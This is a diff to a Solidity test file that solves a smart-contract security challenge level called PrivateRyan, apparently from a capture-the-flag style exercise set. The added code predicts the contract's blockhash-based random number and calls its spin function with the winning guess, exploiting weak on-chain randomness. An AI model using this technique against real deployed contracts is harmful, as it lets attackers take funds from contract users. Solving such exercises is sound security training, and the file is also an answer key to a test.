@@ -8,15 +8,24 @@ import "src/02_PrivateRyan/PrivateRyan.sol";
 contract PrivateRyanTest is BaseTest {
     PrivateRyan instance;
 
+    uint256 seed = 1;
     function setUp() public override {
         super.setUp();
         instance = new PrivateRyan{value: 0.01 ether}();
+        uint256 FACTOR = 1157920892373161954135709850086879078532699843656405640394575840079131296399;
+        uint256 factor = (FACTOR * 100) / 256;
+        uint256 blockNumber = 0;
+        uint256 hashVal = uint256(blockhash(blockNumber));
+        seed =  uint256((uint256(hashVal) / factor)) % 256;
         vm.roll(48743985);
     }
 
     function testExploitLevel() public {
-        /* YOUR EXPLOIT GOES HERE */
-
+        uint256 FACTOR = 1157920892373161954135709850086879078532699843656405640394575840079131296399;
+        uint256 factor = (FACTOR * 100) / 100;
+        uint256 blockNumber = block.number - seed;
+        uint256 hashVal = uint256(blockhash(blockNumber));
+        instance.spin{value: 0.01 ether}(uint256((uint256(hashVal) / factor)) % 100); 
         checkSuccess();
     }
 
